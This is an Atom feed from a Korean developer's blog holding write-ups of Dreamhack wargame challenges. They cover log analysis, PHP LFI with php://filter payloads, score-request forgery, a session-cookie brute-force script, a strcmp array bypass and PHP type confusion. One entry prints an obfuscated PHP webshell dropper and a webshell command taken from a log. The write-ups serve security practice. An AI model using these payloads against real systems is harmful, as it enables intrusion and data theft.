<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-09-10T17:47:23+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<pre><code class="language-mermaild!">sequenceDiagram
</code></pre>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[오직 로컬에서만 되냐 젠장]]></summary></entry><entry><title type="html">[wargame.kr] weblog-1 문제</title><link href="http://localhost:4000/dreamhack/weblog-1_log%ED%99%95%EC%9D%B8%ED%95%98%EA%B8%B0/" rel="alternate" type="text/html" title="[wargame.kr] weblog-1 문제" /><published>2023-09-10T00:00:00+09:00</published><updated>2023-09-10T23:13:00+09:00</updated><id>http://localhost:4000/dreamhack/weblog-1_log%ED%99%95%EC%9D%B8%ED%95%98%EA%B8%B0</id><content type="html" xml:base="http://localhost:4000/dreamhack/weblog-1_log%ED%99%95%EC%9D%B8%ED%95%98%EA%B8%B0/"><![CDATA[<h2 id="문제">문제</h2>
<ul>
  <li><a href="https://dreamhack.io/wargame/challenges/71">weblog-1 문제</a></li>
</ul>

<h2 id="level-0">LEVEL 0</h2>
<ul>
  <li>log 의 기록을 보고 admin 계정을 비밀번호를 찾아주면 된다.</li>
  <li>로그 분석 결과 500 에러(서버 에러)가 발생할 때 나오는 비교 정수 값을 char 로 변환해주면 된다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">'./file/access.log'</span><span class="p">)</span>
<span class="n">keyword</span> <span class="o">=</span> <span class="s">'HTTP/1.1" 500'</span>
<span class="n">keyword2</span> <span class="o">=</span> <span class="s">'))='</span>

<span class="n">arr</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">line</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">readline</span><span class="p">()</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">line</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="s">'end'</span><span class="p">)</span>
        <span class="k">break</span>
    
    <span class="k">if</span> <span class="n">keyword</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
        <span class="k">continue</span>

    <span class="n">a</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="n">keyword2</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
        <span class="k">continue</span>
    <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="p">[</span><span class="n">a</span><span class="o">+</span><span class="nf">len</span><span class="p">(</span><span class="n">keyword2</span><span class="p">):]</span>

    <span class="n">l</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="s">','</span><span class="p">)</span>

    <span class="n">arr</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">line</span><span class="p">[:</span><span class="n">l</span><span class="p">])))</span>
    <span class="c1"># print(line[:l])
</span>    
<span class="nf">print</span><span class="p">(</span><span class="s">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">arr</span><span class="p">))</span>

<span class="n">f</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</code></pre></div></div>

<h2 id="level-1">LEVEL 1</h2>
<ul>
  <li>config.php 파일을 추출해야 한다.</li>
  <li>include 를 이용하여 파일을 추출하는 것을 확인할 수 있다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/admin/?page=php://filter/convert.base64-encode/resource=../config.php
</code></pre></div></div>

<h2 id="level-2">LEVEL 2</h2>
<ul>
  <li>
    <p>LFI(Local File Include) 취약점을 이용하여 서버의 php 코드를 실행하는 것을 확인할 수 있다.</p>
  </li>
  <li>
    <p>악성 php 코드 저장</p>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>172.17.0.1 - - [02/Jun/2020:09:55:16 +0000] "GET /admin/?page=memo.php&amp;memo=%3C?php%20function%20m($l,$T=0){$K=date(%27Y-m-d%27);$_=strlen($l);$__=strlen($K);for($i=0;$i%3C$_;$i%2b%2b){for($j=0;$j%3C$__;%20$j%2b%2b){if($T){$l[$i]=$K[$j]^$l[$i];}else{$l[$i]=$l[$i]^$K[$j];}}}return%20$l;}%20m(%27bmha[tqp[gkjpajpw%27)(m(%27%2brev%2bsss%2blpih%2bqthke`w%2bmiecaw*tlt%27),m(%278;tlt$lae`av,%26LPPT%2b5*5$040$Jkp$Bkqj`%26-?w}wpai,%20[CAP_%26g%26Y-?%27));%20?%3E HTTP/1.1" 200 1098 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
</code></pre></div></div>

<ul>
  <li>코드를 살펴본 결과 memo.php 에서 memo 파라미터로 들어오는 값을 session 에 저장하는 것을 확인할 수 있다.</li>
  <li>session에 저장된 값을 불러오기 위해서 include 기능을 이용한 것을 확인할 수 있다.</li>
  <li>악성 코드가 서버에서 실행된다!</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>172.17.0.1 - - [02/Jun/2020:09:55:39 +0000] "GET /admin/?page=/var/lib/php/sessions/sess_ag4l8a5tbv8bkgqe9b9ull5732 HTTP/1.1" 200 735 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
</code></pre></div></div>

<h2 id="level-3">LEVEL 3</h2>
<ul>
  <li>웹 쉘 코드가 저장된 위치를 알아내야 한다.</li>
  <li>level2 에서 실행시킨 코드이다.</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
<span class="k">function</span> <span class="n">m</span><span class="p">(</span><span class="nv">$l</span><span class="p">,</span><span class="nv">$T</span><span class="o">=</span><span class="mi">0</span><span class="p">){</span>
	<span class="nv">$K</span><span class="o">=</span><span class="nb">date</span><span class="p">(</span><span class="s1">'Y-m-d'</span><span class="p">);</span>
	<span class="nv">$_</span><span class="o">=</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$l</span><span class="p">);</span>
	<span class="nv">$__</span><span class="o">=</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$K</span><span class="p">);</span>
	<span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nv">$_</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
		<span class="k">for</span><span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$j</span><span class="o">&lt;</span><span class="nv">$__</span><span class="p">;</span> <span class="nv">$j</span><span class="o">++</span><span class="p">){</span>
			<span class="k">if</span><span class="p">(</span><span class="nv">$T</span><span class="p">){</span>
				<span class="nv">$l</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">=</span><span class="nv">$K</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span><span class="o">^</span><span class="nv">$l</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
			<span class="p">}</span><span class="k">else</span><span class="p">{</span>
				<span class="nv">$l</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">=</span><span class="nv">$l</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">^</span><span class="nv">$K</span><span class="p">[</span><span class="nv">$j</span><span class="p">];</span>
			<span class="p">}</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="nv">$l</span><span class="p">;</span>
<span class="p">}</span> 
<span class="nf">m</span><span class="p">(</span><span class="s1">'bmha[tqp[gkjpajpw'</span><span class="p">)(</span><span class="nf">m</span><span class="p">(</span><span class="s1">'+rev+sss+lpih+qthke`w+miecaw*tlt'</span><span class="p">),</span><span class="nf">m</span><span class="p">(</span><span class="s1">'8;tlt$lae`av,&amp;LPPT+5*5$040$Jkp$Bkqj`&amp;-?w}wpai, [CAP_&amp;g&amp;Y-?'</span><span class="p">));</span> 
<span class="cp">?&gt;</span>
</code></pre></div></div>

<ul>
  <li>난독화 되어있는 것을 확인할 수 있다.</li>
  <li><code class="language-plaintext highlighter-rouge">date('Y-m-d')</code> 를 02/Jun/2020 즉 <code class="language-plaintext highlighter-rouge">2020-06-02</code> 로 바꾼 다음 php 로 실행시켜 주면 어떻게 웹 쉘 코드를 업로드 하였는지 출력되는 것을 확인할 수 있다.</li>
</ul>

<h2 id="level-4">LEVEL 4</h2>
<ul>
  <li>처음으로 실행된 명령어는 로그를 보면 바로 알 수 있다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>172.17.0.1 - - [02/Jun/2020:09:56:32 +0000] "GET /uploads/images.php?c=whoami HTTP/1.1" 404 490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
</code></pre></div></div>]]></content><author><name>Jung MinGyu</name></author><category term="dreamhack" /><category term="wargame" /><category term="php" /><category term="access.log" /><summary type="html"><![CDATA[weblog-1 문제 풀이]]></summary></entry><entry><title type="html">[wargame.kr] PHP LFI 문제</title><link href="http://localhost:4000/dreamhack/php_LFI_vuln/" rel="alternate" type="text/html" title="[wargame.kr] PHP LFI 문제" /><published>2023-08-29T00:00:00+09:00</published><updated>2023-08-29T23:13:00+09:00</updated><id>http://localhost:4000/dreamhack/php_LFI_vuln</id><content type="html" xml:base="http://localhost:4000/dreamhack/php_LFI_vuln/"><![CDATA[<h2 id="lfi--php-wrapper">LFI + PHP Wrapper</h2>
<ul>
  <li>include 취약점과 wrapper 취약점을 이용하여 문제를 해결해 주어야 한다.</li>
</ul>

<h3 id="코드-분석">코드 분석</h3>
<ul>
  <li>include 부분에 취약점이 존재한다.</li>
  <li>요청 파라미터로 아무것도 받지 못하면 디펄트로 설정된 main.php 파일을 include 한다.</li>
  <li>get 요청 파라미터로 확장자를 뺀 이름을 넣어주면 <code class="language-plaintext highlighter-rouge">include 파일이름.php</code> 가 include 되는 것을 확인할 수 있다.</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
  <span class="k">include</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">]</span><span class="o">?</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">]</span><span class="mf">.</span><span class="s1">'.php'</span><span class="o">:</span><span class="s1">'main.php'</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<h3 id="php-프로토콜의-filter-기능을-이용한-공격-payload">php 프로토콜의 filter 기능을 이용한 공격 Payload</h3>
<ul>
  <li>
    <p>filter 기능을 이용하면 파일 내용을 먼저 필터링 처리한 다음 php 파일로서 실행이 된다.</p>
  </li>
  <li>방법 1.  <code class="language-plaintext highlighter-rouge">convert.base64-encode</code> 이용하기</li>
  <li>이렇게 하면 flag.php 파일 내용이 먼저 base64 로 인코딩을 한 다음 php 파일로서 실행이 된다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/?page=php://filter/read=convert.base64-encode/resource=/var/www/uploads/flag
</code></pre></div></div>

<ul>
  <li>방법 2. <code class="language-plaintext highlighter-rouge">string.rot13</code></li>
  <li>이렇게 하면 flag.php 파일 내용이 먼저 rot13 로 인코딩을 한 다음 php 파일로서 실행이 된다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/?page=php://filter/read=string.rot13/resource=/var/www/uploads/flag
</code></pre></div></div>

<ul>
  <li>인코딩된 데이터를 사용자는 받을 수 있기 때문에 파일 내용을 확인하기 위해서는 디코딩 작업을 해주면 된다.</li>
</ul>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://www.php.net/manual/en/wrappers.php">php 프로토콜</a></li>
  <li><a href="https://www.php.net/manual/en/filters.php">php 에서 지원하는 필터</a></li>
  <li><a href="https://rot13.com/">rot13 디코더</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="dreamhack" /><category term="wargame" /><category term="php" /><category term="include" /><category term="wrapper" /><summary type="html"><![CDATA[PHP LFI 문제 풀이]]></summary></entry><entry><title type="html">[wargame.kr] fly me to the moon 문제</title><link href="http://localhost:4000/dreamhack/fly_me_to_the_moon/" rel="alternate" type="text/html" title="[wargame.kr] fly me to the moon 문제" /><published>2023-08-28T00:00:00+09:00</published><updated>2023-08-28T23:13:00+09:00</updated><id>http://localhost:4000/dreamhack/fly_me_to_the_moon</id><content type="html" xml:base="http://localhost:4000/dreamhack/fly_me_to_the_moon/"><![CDATA[<p><a href="https://dreamhack.io/wargame/challenges/324">문제</a></p>

<h2 id="요청-위조-방법-1">요청 위조 (방법 1)</h2>
<ul>
  <li>게임이 완료되고 요청하는 점수와 토큰 값을 위조해주면 된다.</li>
</ul>

<h3 id="분석">분석</h3>
<ul>
  <li>token 값을 일정 주기로 받아오는 것을 확인할 수 있다.</li>
  <li>게임 완료 시 토큰 값과 게임 점수를 같이 전송하는 것을 확인할 수 있다.</li>
  <li>게임을 시작할 때는 token 값을 안 받아오는 것을 확인할 수 있었다.</li>
</ul>

<h3 id="공격">공격</h3>
<ul>
  <li>burp suite 의 intercept 기능을 이용하여 31337 이상으로 만들어 요청을 보내주면 된다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>token=9355&amp;score=3000000
</code></pre></div></div>

<h2 id="javascript-위조-방법-2">javascript 위조 (방법 2)</h2>
<ul>
  <li>js 방어법을 우회하는 방법을 이용하였다.</li>
  <li>javascipt 를 이용한 게임이기 때문에 javascipt 코드를 위조하여 점수를 마음대로 바꿀 수 있다.</li>
  <li>js 코드를 분석해 보면 사람이 못 알아보게 encode 되어 있는 것을 확인할 수 있다.</li>
  <li>따라서 사람이 알아볼 수 있게 <code class="language-plaintext highlighter-rouge">de4js</code> 를 이용하여 decode 를 진행해 주었다.</li>
</ul>

<h3 id="코드-위조">코드 위조</h3>
<ul>
  <li>코드를 보면 다음 위치에서 점수를 서버로 보내는 것을 확인할 수 있다.</li>
</ul>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nf">if </span><span class="p">(</span><span class="nx">BTunnelGame</span><span class="p">.</span><span class="nf">checkLife</span><span class="p">())</span> <span class="p">{</span>
        <span class="nf">setTimeout</span><span class="p">(</span><span class="dl">'</span><span class="s1">updateTunnel()</span><span class="dl">'</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nf">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">img#ship</span><span class="dl">'</span><span class="p">).</span><span class="nf">fadeOut</span><span class="p">(</span><span class="dl">'</span><span class="s1">slow</span><span class="dl">'</span><span class="p">);</span>
        <span class="nf">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">img.left_wall</span><span class="dl">'</span><span class="p">).</span><span class="nf">css</span><span class="p">(</span><span class="dl">'</span><span class="s1">display</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">none</span><span class="dl">'</span><span class="p">);</span>
        <span class="nf">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">img.right_wall</span><span class="dl">'</span><span class="p">).</span><span class="nf">css</span><span class="p">(</span><span class="dl">'</span><span class="s1">display</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">none</span><span class="dl">'</span><span class="p">);</span>
        <span class="nx">$</span><span class="p">.</span><span class="nf">ajax</span><span class="p">({</span>
            <span class="na">type</span><span class="p">:</span> <span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span>
            <span class="na">url</span><span class="p">:</span> <span class="dl">'</span><span class="s1">high-scores.php</span><span class="dl">'</span><span class="p">,</span>
            <span class="na">data</span><span class="p">:</span> <span class="dl">'</span><span class="s1">token=</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">token</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">&amp;score=</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">BTunnelGame</span><span class="p">.</span><span class="nf">getScore</span><span class="p">(),</span>
            <span class="na">success</span><span class="p">:</span> <span class="nf">function </span><span class="p">(</span><span class="nx">_0x8618x19</span><span class="p">)</span> <span class="p">{</span>
                <span class="nf">showHighScores</span><span class="p">(</span><span class="nx">_0x8618x19</span><span class="p">)</span>
            <span class="p">}</span>
        <span class="p">})</span>
    <span class="p">}</span>
<span class="p">};</span>
</code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">score=</code> 부분의 점수를 위조해주면 된다.</li>
</ul>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="nx">$</span><span class="p">.</span><span class="nf">ajax</span><span class="p">({</span>
            <span class="na">type</span><span class="p">:</span> <span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span>
            <span class="na">url</span><span class="p">:</span> <span class="dl">'</span><span class="s1">high-scores.php</span><span class="dl">'</span><span class="p">,</span>
            <span class="na">data</span><span class="p">:</span> <span class="dl">'</span><span class="s1">token=</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">token</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">&amp;score=</span><span class="dl">'</span> <span class="o">+</span> <span class="mi">3000000</span><span class="p">,</span>
            <span class="na">success</span><span class="p">:</span> <span class="nf">function </span><span class="p">(</span><span class="nx">_0x8618x19</span><span class="p">)</span> <span class="p">{</span>
                <span class="nf">showHighScores</span><span class="p">(</span><span class="nx">_0x8618x19</span><span class="p">)</span>
            <span class="p">}</span>
        <span class="p">})</span>
</code></pre></div></div>

<ul>
  <li>이렇게 위조하여 완성 js 코드를 intercept 기능을 이용하여 원래 코드를 지우고 위조 코드를 붙여 넣어주면 된다.</li>
</ul>

<h2 id="비-정상-요청-방법-3">비 정상 요청 (방법 3)</h2>
<ul>
  <li>분석 결과 token 요청 후 받은 토큰 값과 점수를 같이 서버로 보낸다.</li>
</ul>

<h3 id="공격-1">공격</h3>
<ul>
  <li>먼저 토큰 값을 get 요청으로 받아준다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://서버 주소/token.php
</code></pre></div></div>

<ul>
  <li>그 다음 위에서 받은 토큰 값과 점수를 POST 요청으로 보내주면 된다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://서버 주소/high-scores.php

token=토큰 값&amp;score=30000000000
</code></pre></div></div>

<ul>
  <li>여기서 GET 요청 할 때 와 POST 요청할 때의 PHPSESSID 쿠키 값이 같아야 한다.</li>
</ul>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://lelinhtinh.github.io/de4js/">de4js</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="dreamhack" /><category term="wargame" /><category term="js" /><category term="request" /><summary type="html"><![CDATA[fly me to the moon 문제 풀이.]]></summary></entry><entry><title type="html">[wargame.kr] session id 쿠키 값 위조 문제</title><link href="http://localhost:4000/dreamhack/session_%EC%9C%84%EC%A1%B0/" rel="alternate" type="text/html" title="[wargame.kr] session id 쿠키 값 위조 문제" /><published>2023-08-28T00:00:00+09:00</published><updated>2023-08-29T00:13:00+09:00</updated><id>http://localhost:4000/dreamhack/session_%EC%9C%84%EC%A1%B0</id><content type="html" xml:base="http://localhost:4000/dreamhack/session_%EC%9C%84%EC%A1%B0/"><![CDATA[<p><a href="https://dreamhack.io/wargame/challenges/266">문제</a></p>

<h2 id="session-값-위조">Session 값 위조</h2>
<ul>
  <li>session 값을 admin 아이디가 저장된 세션 값으로 바꿔주면 된다.</li>
</ul>

<h3 id="코드-분석">코드 분석</h3>
<ul>
  <li>admin 계정의 session id 값의 범위는 00 ~ FF 인 것을 확인할 수 있다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">session_storage</span><span class="p">[</span><span class="n">os</span><span class="p">.</span><span class="nf">urandom</span><span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="nf">hex</span><span class="p">()]</span> <span class="o">=</span> <span class="s">'admin'</span>
</code></pre></div></div>

<h3 id="공격-payload">공격 Payload</h3>
<ul>
  <li>만들어 질 수 있는 모든 session id 값을 쿠키에 넣어주면 된다.</li>
  <li>00 ~ FF 를 모두 sessionid 쿠키 값에 넣어주면서 admin 에 해당하는 session id 값을 찾아주면 된다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>

<span class="n">URL</span> <span class="o">=</span> <span class="s">"공격 주소"</span>
<span class="n">COOKIE</span> <span class="o">=</span> <span class="p">{</span><span class="s">"sessionid"</span><span class="p">:</span><span class="s">""</span><span class="p">}</span>

<span class="k">def</span> <span class="nf">request</span><span class="p">()</span><span class="o">-&gt;</span><span class="nb">str</span><span class="p">:</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">URL</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">COOKIE</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">res</span><span class="p">.</span><span class="n">text</span>

<span class="k">def</span> <span class="nf">find_sessionid</span><span class="p">():</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">256</span><span class="p">):</span>
        <span class="c1"># print(str(hex(i)).replace('0x','').zfill(2))
</span>        <span class="n">COOKIE</span><span class="p">[</span><span class="s">"sessionid"</span><span class="p">]</span><span class="o">=</span><span class="nf">str</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">i</span><span class="p">)).</span><span class="nf">replace</span><span class="p">(</span><span class="s">'0x'</span><span class="p">,</span><span class="s">''</span><span class="p">).</span><span class="nf">zfill</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
        <span class="n">t</span> <span class="o">=</span> <span class="nf">request</span><span class="p">()</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
        <span class="k">if</span> <span class="s">'admin'</span> <span class="ow">in</span> <span class="n">t</span><span class="p">.</span><span class="nf">lower</span><span class="p">():</span>
            <span class="nf">print</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">i</span><span class="p">)).</span><span class="nf">replace</span><span class="p">(</span><span class="s">'0x'</span><span class="p">,</span><span class="s">''</span><span class="p">).</span><span class="nf">zfill</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
            <span class="k">break</span>
    <span class="k">return</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="c1"># request()
</span>    <span class="nf">find_sessionid</span><span class="p">()</span>
    <span class="k">return</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="nf">main</span><span class="p">()</span>

</code></pre></div></div>]]></content><author><name>Jung MinGyu</name></author><category term="dreamhack" /><category term="wargame" /><category term="session" /><summary type="html"><![CDATA[session 위조 문제 풀이.]]></summary></entry><entry><title type="html">[wargame.kr]php v5.3 strcmp 취약점 문제</title><link href="http://localhost:4000/dreamhack/php_5_3_strcmp/" rel="alternate" type="text/html" title="[wargame.kr]php v5.3 strcmp 취약점 문제" /><published>2023-08-27T00:00:00+09:00</published><updated>2023-08-27T23:13:00+09:00</updated><id>http://localhost:4000/dreamhack/php_5_3_strcmp</id><content type="html" xml:base="http://localhost:4000/dreamhack/php_5_3_strcmp/"><![CDATA[<h2 id="strcmp-취약점">strcmp 취약점</h2>
<ul>
  <li>php 버전 5.3 에서 발생한 취약점이다.</li>
  <li>strcmp 에 Array 와 string을 넣어 비교할 때 발생하는 취약점이다.</li>
</ul>

<h3 id="array-로-입력받기">Array 로 입력받기</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>test[]=aa
</code></pre></div></div>

<ul>
  <li>php 에서 해당 요청을 받으면 array 형태로 받는 것을 확인할 수 있다.</li>
</ul>

<h3 id="취약점-활용">취약점 활용</h3>
<ul>
  <li><code class="language-plaintext highlighter-rouge">strcmp(Array(),string)</code> 을 비교하면 null 값을 리턴한다.</li>
  <li><code class="language-plaintext highlighter-rouge">null==0</code> 을 비교하면 true 가 된다.</li>
</ul>

<h3 id="문제">문제</h3>
<ul>
  <li><a href="https://dreamhack.io/wargame/challenges/328">문제</a></li>
  <li><code class="language-plaintext highlighter-rouge">strcmp($_POST['password'], $password) == 0</code> 이 true 여야 flag 값을 받아볼 수 있다.</li>
  <li>이 때 strcmp(Array(), string) 일 때 null 값을 반환하게 된다.</li>
  <li>그리고 <code class="language-plaintext highlighter-rouge">null == 0</code> 은 true 이기 때문에 flag 값을 받아볼 수 있다.</li>
</ul>

<h3 id="공격-payload">공격 payload</h3>
<ul>
  <li>array 형태로 요청을 보내주면 된다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>password[]=123
</code></pre></div></div>]]></content><author><name>Jung MinGyu</name></author><category term="dreamhack" /><category term="wargame" /><category term="sqli" /><summary type="html"><![CDATA[php v5.3 strcmp 취약점에 대하여 알아보자.]]></summary></entry><entry><title type="html">[wargame.kr]php type confusion 문제</title><link href="http://localhost:4000/dreamhack/php_typeconfusion/" rel="alternate" type="text/html" title="[wargame.kr]php type confusion 문제" /><published>2023-08-27T00:00:00+09:00</published><updated>2023-08-27T23:13:00+09:00</updated><id>http://localhost:4000/dreamhack/php_typeconfusion</id><content type="html" xml:base="http://localhost:4000/dreamhack/php_typeconfusion/"><![CDATA[<h2 id="php-형-변환">PHP 형 변환</h2>
<ul>
  <li><a href="https://dreamhack.io/wargame/challenges/329">문제</a></li>
  <li>서로 비교할 때 비교 각 대상의 타입이 일치하지 않아 발생하는 취약점이다.</li>
  <li>php 의 <code class="language-plaintext highlighter-rouge">==</code> 을 이용하여 비교를 진행할 때 발생한다.</li>
  <li>json 로 입력을 받을 때 발생할 수 있다.</li>
</ul>

<h3 id="문제-분석">문제 분석</h3>
<ul>
  <li>json 형태로 입력을 받아 디코드 한다.</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$json</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'json'</span><span class="p">]);</span>
</code></pre></div></div>

<ul>
  <li>
    <p>json 형태로 넘겨줄 때 공격자는 타입을 정수형 또는 boolean 형 또는 string 형으로 넘겨줄 수 있다.</p>
  </li>
  <li>
    <p>현재 여기서 <code class="language-plaintext highlighter-rouge">==</code> 을 이용하여 두 개의 값이 같은지만을 확인한다.</p>
  </li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="nv">$json</span><span class="o">-&gt;</span><span class="n">key</span> <span class="o">==</span> <span class="nv">$key</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li>즉 자동으로 형 <code class="language-plaintext highlighter-rouge">$key</code> 값이 앞의 비교하는 형식으로 변환이 되는 취약점을 가지고 있다.</li>
</ul>

<h3 id="테스트">테스트</h3>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$a</span> <span class="o">==</span> <span class="s2">"dsf"</span><span class="p">){</span>
        <span class="k">echo</span> <span class="s2">"true"</span><span class="p">;</span>
<span class="p">}</span><span class="k">else</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"false"</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<ul>
